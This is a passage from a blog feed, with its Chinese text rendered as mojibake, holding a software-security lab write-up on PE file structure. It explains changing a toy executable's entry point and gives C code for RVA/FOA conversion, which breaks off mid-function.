ä¸ºè°ƒè¯•å™¨å¤„ç†å¼‚å¸¸çš„é€Ÿåº¦éå¸¸æ…¢ã€‚</strong>é»˜è®¤æƒ…å†µä¸‹ï¼Œè°ƒè¯•å™¨å¤„ç†å¼‚å¸¸æ—¶éœ€è¦äººä¸ºå¹²é¢„ï¼Œè¿™å¯¼è‡´å¤§é‡å»¶è¿Ÿã€‚è™½ç„¶å¾ˆå¤šè°ƒè¯•å™¨å…è®¸æˆ‘ä»¬å¿½ç•¥å¼‚å¸¸ï¼Œå°†å¼‚å¸¸ç›´æ¥è¿”å›ç¨‹åºï¼Œä½†è¿™æ ·æ“ä½œä»ç„¶å­˜åœ¨ä¸å°çš„å»¶è¿Ÿã€‚</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>Anti</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>anti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è½¯ä»¶å®‰å…¨å®éªŒT3</title>
    <link href="/2023/10/21/software_security_task3/"/>
    <url>/2023/10/21/software_security_task3/</url>
    
    <content type="html"><![CDATA[<p>ã€Šè½¯ä»¶å®‰å…¨ã€‹è¯¾ç¨‹T3å®éªŒä»»åŠ¡è¯¦ç»†æ­¥éª¤</p><span id="more"></span><h3 id="1-ä¿®æ”¹å‡½æ•°å…¥å£ç‚¹åœ°å€ï¼Œä½¿å¾—hello25-exeç›´æ¥å¼¹å‡ºç¬¬äºŒä¸ªæ¶ˆæ¯æ¡†"><a href="#1-ä¿®æ”¹å‡½æ•°å…¥å£ç‚¹åœ°å€ï¼Œä½¿å¾—hello25-exeç›´æ¥å¼¹å‡ºç¬¬äºŒä¸ªæ¶ˆæ¯æ¡†" class="headerlink" title="1.ä¿®æ”¹å‡½æ•°å…¥å£ç‚¹åœ°å€ï¼Œä½¿å¾—hello25.exeç›´æ¥å¼¹å‡ºç¬¬äºŒä¸ªæ¶ˆæ¯æ¡†"></a>1.ä¿®æ”¹å‡½æ•°å…¥å£ç‚¹åœ°å€ï¼Œä½¿å¾—hello25.exeç›´æ¥å¼¹å‡ºç¬¬äºŒä¸ªæ¶ˆæ¯æ¡†</h3><p>çŸ¥è¯†é“ºå«ï¼š</p><p>ï¼ˆ1ï¼‰EXEè£…è½½æµç¨‹ï¼š</p><ul><li>é¦–å…ˆæ“ä½œç³»ç»Ÿç»™exeæ–‡ä»¶åˆ†é…4GBçš„è™šæ‹Ÿç©ºé—´ï¼Œå…¶ä¸­é«˜2Gç”¨äºæ“ä½œç³»ç»Ÿçš„å‡½æ•°ï¼Œæ¯”å¦‚<code>uer32.dll</code>ï¼Œä½2Gç”¨äºç”¨æˆ·çš„ä½¿ç”¨ã€‚åˆ†é…å®Œç©ºé—´åï¼ŒæŠŠexeæœ¬èº«çš„ä»£ç åŠ è½½åˆ°ç”±ImageBaseæŒ‡å®šçš„åœ°å€ï¼Œé€šå¸¸æ¥è¯´æ˜¯<code>0x400000</code>ã€‚</li><li>å…¶æ¬¡ï¼Œæ“ä½œç³»ç»Ÿå¾€4GBç©ºé—´ä¸­åŠ è½½å„ç§DLLæ–‡ä»¶ï¼Œç”±äºDLLæ–‡ä»¶å¾€å¾€ä¼šæœ‰å†²çªï¼Œä¸èƒ½æŒ‰ç…§é¢„è®¡ImageBaseè£…è½½ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨DLLæœ¬èº«æä¾›çš„é‡å®šä½è¡¨ä¿®å¤è‡ªå·±çš„åœ°å€ã€‚ï¼ˆDLLæ–‡ä»¶ä¸EXEæ–‡ä»¶ä¸€æ ·ï¼Œéƒ½æ˜¯PEç»“æ„ï¼‰</li><li>â€”â€”æ‰§è¡Œå…¶ä»–çš„æ“ä½œâ€”â€”ï¼Œåç»­å†æ¢ç©¶</li><li>ç„¶åæ“ä½œç³»ç»Ÿè·³è½¬åˆ°ç”±<code>AddressOfEntryPoint+ImageBase</code>çš„åœ°å€è¿›è¡Œæ‰§è¡Œä»£ç </li></ul><p>ï¼ˆ2ï¼‰RVAï¼ŒFOAæ˜¯ä»€ä¹ˆï¼š</p><p>RVA</p><p>åœ¨è§£é‡Šæ­¤åè¯ä¹‹å‰ï¼Œéœ€è¦æ˜ç™½ä¸€ä»¶äº‹æƒ…ï¼Œå³PEæ–‡ä»¶å®é™…ä¸Šæœ‰ä¸¤ç§å­˜åœ¨çŠ¶æ€ï¼Œä¸€ç§æ˜¯å­˜å‚¨åœ¨ç¡¬ç›˜ä¸­ï¼Œä¹Ÿå°±æ˜¯16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€çš„æ ·å­ï¼Œè¿˜æœ‰ä¸€ç§åˆ™æ˜¯è¿è¡Œæ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šåˆ†é…ä¸€ä¸ªç‹¬ç«‹çš„è™šæ‹Ÿç©ºé—´ç»™å®ƒï¼Œé€šå¸¸è¿™ä¸ªè™šæ‹Ÿç©ºé—´å¤§å°æ˜¯4GBï¼Œç„¶åæŠŠè¿™ä¸ªæ–‡ä»¶è£…è½½åˆ°è¿™ä¸ª4GBä¸­ï¼Œè£…è½½åˆ°å“ªï¼Œåˆ™æ˜¯å…ˆç”±ImageBaseå­—æ®µå†³å®šï¼Œä¸€æ—¦ç¡®å®šå¥½ä»å“ªä¸ªåœ°æ–¹è£…è½½ï¼Œå°±ç›¸å½“äºç¡®å®šäº†ä¸€ä¸ªåŸºå€ï¼Œè€Œè¿™ä¸ªRVAå°±æ˜¯ç›¸å¯¹è¿™ä¸ªåŸºå€çš„åç§»ã€‚</p><p>æ¯”å¦‚è¿™ä¸ªæ–‡ä»¶ä»å†…å­˜ä¸­0x10000000å¼€å§‹è£…è½½ï¼Œå¦‚æœRVAæ˜¯0x32ï¼Œé‚£ä¹ˆåœ¨å†…å­˜ä¸­å®ƒçš„åœ°å€å°±æ˜¯0x10000032</p><p>FOA</p><p>æ—¢ç„¶PEæ–‡ä»¶æœ‰ä¸¤ç§æ ¼å¼ï¼Œé‚£ä¹ˆåç§»è‚¯å®šä¹Ÿæœ‰ä¸¤ç§ï¼Œåˆšåˆšçš„æåŠçš„RVAæ˜¯åœ¨è™šæ‹Ÿå†…å­˜ä¸­çš„ï¼Œé‚£ä¹ˆè¿˜æœ‰ä¸€ç§å°±æ˜¯åœ¨æ–‡ä»¶ä¸­çš„åç§»ï¼Œå³FOA - File Offset Addressï¼Œä¹Ÿå°±æ˜¯åœ¨16è¿›åˆ¶æ–‡æœ¬ç¼–è¾‘å™¨é‡Œçš„åç§»</p><p>RVAå’ŒFOAçš„æ¦‚å¿µä¼šè´¯ç©¿æ•´ä¸ªPEæ–‡ä»¶çš„å­¦ä¹ ï¼Œä¸€å®šè¦ç†è§£æ¸…æ¥š</p><p>ç°åœ¨å°±å¯ä»¥å¼€å§‹ä¿®æ”¹OEPäº†ã€‚</p><p>åˆ©ç”¨PEç›¸å…³å·¥å…·æŸ¥è¯¢PEæ–‡ä»¶ç»“æ„</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20192021.png"></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20191646.png"></p><p>å¯ä»¥çœ‹åˆ°å…¶<code>ImageBase</code>æ˜¯<code>0x400000</code>ï¼Œ<code>AddressOfEntryPoint</code>æ˜¯<code>0x1000</code>ï¼Œé‚£ä¹ˆå…¶åœ¨åŠ è½½ååº”è¯¥ä»<code>0x401000</code>å¼€å§‹æ‰§è¡Œï¼Œå°†å…¶è½½å…¥ODæˆ–è€…x32dbgã€‚ï¼ˆæˆ‘ä½¿ç”¨çš„æ˜¯x32dbgï¼‰</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20193002.png"></p><p>å‘ç°å…¶æœç„¶æ˜¯ä»<code>0x401000</code>å¤„å¼€å§‹æ‰§è¡Œï¼Œä¸é¢„æœŸç›¸ç¬¦ã€‚</p><p>é‚£ä¹ˆåªéœ€è¦ä¿®æ”¹OEPå³å¯ï¼Œé—®é¢˜æ˜¯ä¿®æ”¹å»å“ªå‘¢ï¼Ÿ</p><p>è¿™é‡Œéœ€è¦çŸ¥é“<code>MessageBox</code>()çš„çš„ä½¿ç”¨ï¼Œä»¥åŠä¼ å‚æ–¹å¼ï¼š</p><blockquote><p>ä¼ å‚æ–¹å¼ï¼šåœ¨32ä½ç¨‹åºä¸­ï¼Œå‡½æ•°çš„å‚æ•°é€šå¸¸éƒ½æ˜¯é€šè¿‡æ ˆæ¥ä¼ é€’çš„ï¼Œå¹¶ä¸”éµå¾ªç›¸å…³çš„è°ƒç”¨çº¦å®šï¼Œæ¯”å¦‚å…ˆæŠŠå“ªä¸ªå‡½æ•°å‹æ ˆï¼Œç”±è°æ¥æ¸…æ ˆ</p><p>è€Œåœ¨è¿™é‡Œï¼Œæ˜¯å…ˆæŠŠå·¦è¾¹çš„å‚æ•°å‹æ ˆã€‚æ¯”å¦‚ä¼ é€’å‚æ•°<code>MessageBox(a,b,c,d)</code>ï¼Œåˆ™å…ˆ<code>push a</code>ï¼Œå†<code>push b</code>ç­‰ã€‚</p><p>å‚æ•°çš„å«ä¹‰ï¼šMessagebox(a,b,c,d)ä¸­ï¼Œå‚æ•°<code>a</code>æ˜¯æ‰€å±å¥æŸ„ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªçª—å£å±äºè°ï¼Œåœ¨è¿™é‡Œé»˜è®¤ä¸º0æˆ–è€…ä¿æŒä¸€è‡´ä¹Ÿè¡Œï¼ŒWinæ²¡æœ‰å¯¹æ­¤æœ‰ä¸¥æ ¼çš„æ£€æŸ¥ï¼›å‚æ•°<code>b</code>æ˜¯æ ‡é¢˜ï¼›å‚æ•°<code>c</code>æ˜¯æ–‡æœ¬å†…å®¹ï¼›å‚æ•°<code>d</code>æ˜¯çª—å£ç±»å‹ï¼Œæ¯”å¦‚æ˜¯æ­£ç¡®é”™è¯¯æ¡†ï¼Œè¿˜æ˜¯è­¦å‘Šæ¡†ï¼Œé»˜è®¤ä¸º0å³å¯</p><p>ç›¸å…³ä¿¡æ¯å¯ä»¥æŸ¥è¯¢<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-messagebox">MSDN</a>]</p></blockquote><p>å› æ­¤åªéœ€è¦æŠŠOEPæ”¹åˆ°<code>0x401016</code>å³å¯ï¼Œä¹Ÿå°±æ˜¯æŠŠ<code>AddressOfEntryPoint</code>æ”¹ä¸º<code>1016</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20193249.png"></p><h3 id="2-æ‰“å¼€hello25-exeï¼Œå¯¹å…¶ä¸­ç»™å®šä»»æ„RVAåœ°å€ï¼Œå°†å…¶è½¬æ¢æˆæ–‡ä»¶åç§»ï¼Œå¹¶åœ¨æ–‡ä»¶ä¸­æ‰¾åˆ°å¯¹åº”æ•°æ®"><a href="#2-æ‰“å¼€hello25-exeï¼Œå¯¹å…¶ä¸­ç»™å®šä»»æ„RVAåœ°å€ï¼Œå°†å…¶è½¬æ¢æˆæ–‡ä»¶åç§»ï¼Œå¹¶åœ¨æ–‡ä»¶ä¸­æ‰¾åˆ°å¯¹åº”æ•°æ®" class="headerlink" title="2.æ‰“å¼€hello25.exeï¼Œå¯¹å…¶ä¸­ç»™å®šä»»æ„RVAåœ°å€ï¼Œå°†å…¶è½¬æ¢æˆæ–‡ä»¶åç§»ï¼Œå¹¶åœ¨æ–‡ä»¶ä¸­æ‰¾åˆ°å¯¹åº”æ•°æ®"></a>2.æ‰“å¼€hello25.exeï¼Œå¯¹å…¶ä¸­ç»™å®šä»»æ„RVAåœ°å€ï¼Œå°†å…¶è½¬æ¢æˆæ–‡ä»¶åç§»ï¼Œå¹¶åœ¨æ–‡ä»¶ä¸­æ‰¾åˆ°å¯¹åº”æ•°æ®</h3><p>çŸ¥è¯†é“ºå«ï¼š</p><p>ç›¸ä¿¡ä½ å·²ç»çŸ¥é“RVAå’ŒFOAæ˜¯ä»€ä¹ˆï¼Œé‚£ä¹ˆç»§ç»­æ¢ç©¶Windowsæ˜¯æ€æ ·æŠŠPEæ–‡ä»¶åŠ è½½è¿›å†…å­˜çš„å§ï¼</p><p>ä¹‹å‰æåŠWindowsä¼šåˆ†é…4GBç©ºé—´ï¼Œç„¶åæŠŠPEè‡ªå·±çš„ä»£ç è£…è½½è¿›ä½2Gï¼Œå¹¶ä¸”æ˜¯ä»<code>ImageBase</code>å¤„å¼€å§‹ä¼˜å…ˆè£…è½½ï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯å°±æ˜¯ä»<code>ImageBase</code>å¤„å¼€å§‹ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚è£…è½½å‘¢ï¼Ÿ</p><p>æ˜¯ä½†ä¸å®Œå…¨æ˜¯ï¼Œåœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦å¯¹PEæ–‡ä»¶ç»“æ„æœ‰ä¸€ä¸ªå®è§‚çš„è®¤è¯†</p><p>è¿™é‡Œæˆ‘ç›´æ¥è´´ä¸€å¼ å¤§å›¾ï¼Œå»ºè®®åˆ†å±æ”¾å¤§æµè§ˆè§‚çœ‹</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202310130834634.jpg"></p><p>åªçœ‹æœ€ä¸Šé¢ä¸€è¡Œï¼Œå¯ä»¥å‘ç°PEæ–‡ä»¶å¤§è‡´åˆ†ä¸ºå¦‚ä¸‹å‡ éƒ¨åˆ†</p><ul><li>IMGAE_DOS_HEADR - DOSå¤´</li><li>DOS STUB - DOSå¡«å……</li><li>IMAGE_NT_HEADR - NTå¤´</li><li>SECTION_TABLE - èŠ‚è¡¨</li><li>SECTIONS - èŠ‚&#x2F;èŠ‚åŒº</li><li>OTHERS</li></ul><p>æ¯ä¸ªéƒ¨åˆ†åˆæˆ–å¤šæˆ–å°‘å¼•ç”³å‡ºè®¸å¤šå°è¡¨ï¼Œå…¶å®è¿™äº›å°è¡¨å°±æ˜¯ä¸€ä¸ªä¸€ä¸ªç»“æ„ä½“ï¼Œå­˜å‚¨åœ¨PEæ–‡ä»¶ç»“æ„ä¸­ã€‚å¯ä»¥è¿™ä¹ˆè¯´ï¼šPEæ–‡ä»¶ç»“æ„å°±æ˜¯ç”±è®¸è®¸å¤šå¤šçš„ç»“æ„ä½“ç»„æˆï¼Œæ¯ä¸ªç»“æ„ä½“é‡Œçš„æ¯ä¸ªæˆå‘˜éƒ½æœ‰ç›¸åº”çš„å«ä¹‰ï¼Œæ¯”å¦‚æŒ‡ç¤ºå“ªä¸ªéƒ¨åˆ†çš„å¼€å§‹ï¼Œå“ªä¸ªéƒ¨åˆ†çš„ç»“æŸï¼Œåœ¨æŒ‡æ¥æŒ‡å»çš„è¿‡ç¨‹ä¸­ï¼Œæ•´ä¸ªæ–‡ä»¶è¿è¡Œæ‰€éœ€è¦çš„ä¿¡æ¯ä¹Ÿå°±æ˜ç¡®äº†ã€‚</p><p>è€Œæ“ä½œç³»ç»Ÿä¼šæŠŠ<code>IMGAE_DOS_HEADR DOS-STUB IMAGE_NT_HEADR SECTION_TABLE</code> ç›´æ¥ä»ImageBaseå¤„å¼€å§‹copyï¼Œåœ¨<code>OPTIONAL_HEADER</code>é‡Œæœ‰ä¸€ä¸ªå­—æ®µ<code>SizeOfHeaders</code>æŒ‡æ˜äº†è¿™äº›å¤§å°ï¼ˆæ–‡ä»¶å¯¹é½åçš„å¤§å°ï¼‰ï¼Œå› æ­¤æ“ä½œç³»ç»Ÿå¯ä»¥ç›´æ¥copyè¿™ä¹ˆå¤§çš„æ•°æ®</p><p>å¯ä»¥ç®€å•æ¯”è¾ƒä¸€ä¸‹</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20203224.png"></p><p>å¯ä»¥å‘ç°æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼Œå¯ä»¥è‡ªè¡Œæ¯”å¯¹åé¢çš„0x200å­—èŠ‚</p><p>è¿™äº›èŠ‚è¡¨çš„æ•°æ®copyå®Œäº†ï¼Œé‚£èŠ‚åŒºçš„æ•°æ®å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬éœ€è¦çŸ¥é“ä¸€ä¸ªä¸œè¥¿ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªèŠ‚è¡¨ä¼šå¯¹åº”ä¸€ä¸ªèŠ‚åŒºï¼ŒèŠ‚è¡¨é‡Œé¢ä¼šæœ‰èŠ‚åŒºçš„ç›¸å…³ä¿¡æ¯ï¼Œæ¯”å¦‚èµ·å§‹ä½ç½®ã€å¤§å°ã€æ‰§è¡Œæƒé™ç­‰ï¼Œè¿™é‡Œé¢ä¸RVAã€FOAç›¸å…³çš„å°±æ˜¯</p><p>è¿™é‡Œç›´æ¥ç»™å‡ºå®Œæ•´çš„è¯´æ˜å§</p><blockquote><p>typedef struct _IMAGE_SECTION_HEADER {<br>    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];&#x2F;&#x2F;8ä¸ªå­—èŠ‚ IMAGE_SIZEOF_SHORT_NAMEæ˜¯å® ç­‰äº8 ä¸€èˆ¬æ˜¯asciiç  èŠ‚åŒºåå­—<br>    union {<br>            DWORD   PhysicalAddress;<br>            DWORD   VirtualSize;<br>    } Misc;&#x2F;&#x2F; æ³¨æ„æ˜¯è”åˆä½“ï¼Œå…¶å«ä¹‰æ˜¯æ²¡æœ‰å¯¹é½çš„åœ¨å†…å­˜ä¸­çœŸå®å°ºå¯¸ è¯¥å€¼å¯ä»¥ä¸å‡†ç¡®<br>    DWORD   VirtualAddress;&#x2F;&#x2F; èŠ‚åŒºåœ¨å†…å­˜ä¸­çš„åç§»åœ°å€ï¼Œæ˜¯RVA<br>    DWORD   SizeOfRawData;&#x2F;&#x2F; èŠ‚åŒºåœ¨æ–‡ä»¶ä¸­å¯¹é½åçš„å°ºå¯¸<br>    DWORD   PointerToRawData;&#x2F;&#x2F; èŠ‚åŒºåœ¨æ–‡ä»¶ä¸­åç§»<br>    DWORD   PointerToRelocations;&#x2F;&#x2F; åœ¨objæ–‡ä»¶ä¸­ä½¿ç”¨ å¯¹exeæ— æ„ä¹‰<br>    DWORD   PointerToLinenumbers;&#x2F;&#x2F; è¡Œå·è¡¨çš„ä½ç½® è°ƒè¯•æ—¶ä½¿ç”¨<br>    WORD    NumberOfRelocations;&#x2F;&#x2F; åœ¨objä¸­ä½¿ç”¨ å¯¹exeæ— æ„ä¹‰<br>    WORD    NumberOfLinenumbers;&#x2F;&#x2F; è¡Œå·è¡¨çš„æ•°é‡ è°ƒè¯•æ—¶ä½¿ç”¨<br>    DWORD   Characteristics;&#x2F;&#x2F; èŠ‚åŒºå±æ€§ å¯å†™å¯è¯»å¯æ‰§è¡Œç­‰ é€šè¿‡æˆ–çš„å½¢å¼æ¥æ·»åŠ å±æ€§<br>                                &#x2F;&#x2F;0x00000020 å«å¯æ‰§è¡Œä»£ç  0x20000000 è¯¥å—å¯æ‰§è¡Œ 0x40000000 å¯è¯» 0x80000000 å¯å†™<br>} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</p></blockquote><p>æ“ä½œç³»ç»Ÿå°±æ ¹æ®å…¶ä¸­çš„<code>PointerToRawData</code>åœ¨æ–‡ä»¶ä¸­æ‰¾åˆ°ç›¸åº”ä½ç½®ï¼Œcopyåˆ°<code>VirtualAddress</code>å¤„çš„åœ°å€ï¼Œå¤§å°ä¸º<code>SizeOfRawData</code>ã€‚</p><p>éå†å®ŒèŠ‚è¡¨ï¼Œä¹Ÿå°±copyå®Œæ‰€æœ‰çš„æ•°æ®ã€‚</p><p>ç»ˆäºï¼Œç°åœ¨å¯ä»¥å¥½å¥½è®²è®²RVAå¦‚ä½•ä¸FOAäº’è½¬äº†</p><p>å…ˆè®²FOAåˆ°RVAï¼Œå³ç»™å®šä¸€ä¸ªFOAï¼Œå¦‚ä½•ç¡®å®šRVAï¼Ÿ</p><p>å¯¹äºæ‰€æœ‰çš„å¤´éƒ¨æ•°æ®ï¼Œå³<code>IMGAE_DOS_HEADR DOS-STUB IMAGE_NT_HEADR SECTION_TABLE</code>ï¼Œæ“ä½œç³»ç»Ÿæ˜¯ç›´æ¥å¤åˆ¶ï¼Œå®ƒä»¬çš„RVAå’ŒFOAæ˜¯ç›¸åŒçš„ã€‚ï¼ˆï¼è¦è®°ä½ï¼ŒRVAå’ŒFOAéƒ½æ˜¯åç§»åœ°å€ï¼Œä¸æ˜¯ç»å¯¹åœ°å€ï¼ï¼‰</p><p>è€Œå¯¹äºèŠ‚åŒºçš„æ•°æ®ï¼Œåˆ™å…ˆå¾—ç¡®å®šå±äºå“ªä¸ªèŠ‚åŒºï¼Œè¿™ä¸ªå½“ç„¶å¥½åŠï¼Œä¸€ä¸ªèŠ‚åŒºä¸€ä¸ªèŠ‚åŒºçš„çœ‹å‘—ï¼Œçœ‹FOAæ˜¯å¦å¤§äºèŠ‚åŒºçš„èµ·å§‹åœ°å€<code>PointerToRawData</code>ï¼ŒåŒæ—¶åˆå°äºè¿™ä¸ªèŠ‚åŒºçš„ç»“æŸåœ°å€<code>PointerToRawData+SizeOfRawData</code>ï¼Œç¡®å®šå®ŒèŠ‚åŒºåï¼Œå°±å¯ä»¥çŸ¥é“è¯¥èŠ‚åŒºçš„åœ¨å†…å­˜çš„åœ°å€å³<code>VirtualAddress</code>ï¼Œè®¡ç®—ä¸€ä¸‹èŠ‚åŒºåç§»<code>FOA-PointerToRawData</code>ï¼Œå†åŠ ä¸ŠèŠ‚åŒºå†å†…å­˜ä¸­èµ·å§‹åœ°å€ï¼Œå³å¯å¾—åˆ°RVA</p><p>å†è®²RVAåˆ°FOAï¼Œå³å®šä¸€ä¸ªRVAï¼Œå¦‚ä½•ç¡®å®šå…¶FOAï¼Ÿ</p><p>åŒæ ·ï¼Œå¯¹äºæ‰€æœ‰çš„å¤´éƒ¨æ•°æ®ï¼Œå³<code>IMGAE_DOS_HEADR DOS-STUB IMAGE_NT_HEADR SECTION_TABLE</code>ï¼Œæ“ä½œç³»ç»Ÿæ˜¯ç›´æ¥å¤åˆ¶ï¼Œå®ƒä»¬çš„RVAå’ŒFOAæ˜¯ç›¸åŒçš„ã€‚</p><p>ç„¶åä¹Ÿæ˜¯ç¡®å®šRVAå±äºå“ªä¸€ä¸ªèŠ‚åŒºï¼ŒæŒ‰ç…§ä¸Šé¢çš„æµç¨‹èµ°ä¸€éå³å¯(ç¡®å®šèŠ‚åŒº &#x3D;&gt; è®¡ç®—èŠ‚åŒºåç§» &#x3D;&gt; è®¡ç®—æ–‡ä»¶åç§» &#x3D;&gt; <code>RVA - VirtualAddress + PointerToRawData</code>  )</p><p>è¿™é‡Œç»™å‡ºæˆ‘çš„ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><br>DWORD <span class="hljs-title function_">FOA_TO_RVA</span><span class="hljs-params">(DWORD FOA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FileHeader= <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br><span class="hljs-keyword">if</span> (FOA &lt; OptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br><span class="hljs-keyword">return</span> FOA;<br>&#125;<br><br>   <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(FOA &gt;= SectionHeader-&gt;PointerToRawData&amp;&amp; FOA &lt; (SectionHeader +<span class="hljs-number">1</span>)-&gt;PointerToRawData)&#123;<br>            DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader += <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//æœ€åä¸€ä¸ªèŠ‚åŒº</span><br>    DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>&#125;<br><br>DWORD <span class="hljs-title function_">RVA_TO_FOA</span><span class="hljs-params">(DWORD RVA,<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>   PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS32 NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER32 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>    <br><br>    FileHeader = (PIMAGE_FILE_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER32)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br>    <br>    <span class="hljs-keyword">if</span> (RVA &lt; 